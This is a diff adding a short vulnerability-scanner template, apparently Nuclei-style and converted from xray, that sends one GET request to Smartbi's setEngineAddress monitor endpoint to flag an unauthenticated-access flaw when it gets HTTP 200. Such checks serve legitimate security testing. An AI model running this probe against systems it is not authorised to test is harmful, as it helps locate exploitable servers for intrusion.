@@ -1,0 +1,21 @@
+id: poc-yaml-smartbi-address-auth_bypass
+
+info:
+  name: poc-yaml-smartbi-address-auth_bypass
+  author: chaitin
+  severity: medium
+  tags: xray-converted,unauth
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=142
+
+http:
+  - raw:
+      - |
+        GET /{{value}}smartbix/api/monitor/setEngineAddress HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
